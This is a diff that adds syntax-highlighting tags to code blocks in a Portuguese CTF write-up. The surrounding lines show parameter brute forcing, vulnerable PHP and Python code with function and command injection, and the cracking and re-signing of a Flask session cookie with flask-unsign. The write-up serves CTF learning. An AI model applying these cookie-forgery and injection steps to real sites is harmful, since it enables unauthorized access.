@@ -20,7 +20,7 @@ Ao acessar https://whirlwind.boita.tech/ o servidor retornar uma mensagem faland
 <img src="/img/aratuctf/Pasted image 20220911180353.png" />
 
 Fazendo brute force de parâmetros com o x8 encontramos um parâmetro válido:
-```
+```bash
 blaidd@arch:~$ x8 -u "https://whirlwind.boita.tech/" -w ~/wordlists/params/medium.txt
  _________  __ ___     _____
 |GET https://whirlwind.boita.tech/?%s
@@ -65,7 +65,7 @@ Outra maneira de executar código com include é através dos filtros do php, se
 <img src="/img/aratuctf/Pasted image 20220911185423.png" />
 
 Script depois das adaptações:
-```
+```python
 import requests
 
 url = "https://inclusive-policy.boita.tech"
@@ -131,7 +131,7 @@ Target: https://toxycuser.boita.tech/
 Source code: [https://github.com/boitatech/aratu-downloads-public/raw/master/ToxycUser.zip](https://github.com/boitatech/aratu-downloads-public/raw/master/ToxycUser.zip "https://github.com/boitatech/aratu-downloads-public/raw/master/ToxycUser.zip")
 
 Analisando o source code percebemos que o arquivo func.php está vulnerável a function injection:
-```
+```php
 function exist($action, $id) {
   if (isset($action) || isset($id)) {
     $action("$id"); //function injection here
@@ -150,7 +150,7 @@ if ($action  == "logs") {
 Mas pra controlar a função a ser executadas precisamos enviar a request do localhost :(
 
 Analisando o index.php percebemos que ele está vulnerável a SSRF:
-```
+```php
 <?php
 
 $url = $_GET["parametrosupersecretors"];
@@ -188,7 +188,7 @@ Ao fazer login o servidor retorna essa tela:
 <img src="/img/aratuctf/Pasted image 20220911233034.png" />
 Essa tela é um rabbit hole pra te fazer perder tempo, então só ignore...
 Se você tentar fazer um brute force de diretórios você não irá encontrar nada, mas se você tentar fazer esse mesmo brute force autenticado usando a wordlist common.txt você irá encontrar as seguintes rotas:
-```
+```text
 /download - 403
 /decoder - 403
 /menu - 200
@@ -199,13 +199,13 @@ Se você tentar fazer um brute force de diretórios você não irá encontrar na
 E ao tentar acessar /decoder ou /download:
 <img src="/img/aratuctf/Pasted image 20220911234156.png" />
 Se tentarmos fazer um decode no cookie conseguimos perceber que temos o parâmetro "premium":
-```
+```bash
 echo 'eyJwcmVtaXVtIjoiZmFsc2UiLCJ1c2VyIjoiYWRtaW4xIn0.Yx6eUA.bzZ-4OjPJhj79bL6QY6o7Mzo_oE' | base64 -d
 
 {"premium":"false","user":"admin1"}base64: invalid input
 ```
 Pela minha experiência eu consegui deduzir que era um cookie de sessão do flask (e era mesmo), então eu tentei fazer um brute force do secret que assina a sessão usando [flask-unsign](https://pypi.org/project/flask-unsign/):
-```
+```bash
 flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJwcmVtaXVtIjoiZmFsc2UiLCJ1c2VyIjoiYWRtaW4xIn0.YxxBPQ.lFUMhPWzfT7rKckyAoZqM45TwBM' --no-literal-eval
 
 [*] Session decodes to: {'premium': 'false', 'user': 'admin1'}
@@ -215,7 +215,7 @@ b'mypassword'
 ```
 
 Uma vez que temos o secret podemos alterar o parâmetro "premium" pra true e assinar o cookie:
-```
+```bash
 flask-unsign --sign --cookie "{'premium': 'true', 'user': 'admin1'}" --secret 'mypassword'
 
 eyJwcmVtaXVtIjoidHJ1ZSIsInVzZXIiOiJhZG1pbjEifQ.Yx6fDw.EdvXJlkgV0otly5XGqcHn-5IbpY
@@ -223,7 +223,7 @@ eyJwcmVtaXVtIjoidHJ1ZSIsInVzZXIiOiJhZG1pbjEifQ.Yx6fDw.EdvXJlkgV0otly5XGqcHn-5Ibp
 
 Agora podemos acessar /download que irá fazer o download do script que roda na rota /decoder
 Lendo o source code facilmente podemos identificar uma issue de command injection:
-```
+```python
 import os; from tkinter import *
 ...
 def decode(txt):
@@ -256,7 +256,7 @@ Target: https://sandbox.boita.tech/
 Source code: https://aratu-public-downloads.s3.amazonaws.com/sandbox.zip
 
 A sandbox é basicamente uma versão mais difícil da baby sandbox:
-```
+```php
 if(isset($_GET['username'])){
 	$param = $_GET['username'];
 	$username = preg_replace("/[^a-zA-Z0-9_\$\{\}_()\-\>\,]+/mi", "", $param);
